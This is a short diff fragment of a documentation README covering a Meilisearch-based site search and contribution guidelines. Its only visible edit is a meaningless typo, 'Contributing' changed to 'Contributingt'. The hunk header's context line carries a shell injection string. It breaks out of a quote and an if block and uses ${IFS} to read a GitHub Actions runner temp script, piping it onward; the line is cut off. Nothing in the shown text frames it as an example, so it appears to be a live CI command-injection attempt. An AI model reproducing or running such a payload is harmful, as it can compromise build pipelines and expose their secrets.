@@ -19,7 +19,7 @@ a";fi;cat${IFS}/home/runner/work/_temp/bbebc0d5-86f5-4fab-b3c8-f0585d39b651.sh|b
 The cross-site search in the documentation is built as a separate Upsun app
 from the files in the `search` directory using [Meilisearch](https://www.meilisearch.com/).
 
-## Contributing
+## Contributingt
 
 Our documentation is public because we want your help in improving and maintaining it.
 See our [contribution guidelines](CONTRIBUTING.md) for how to make changes.
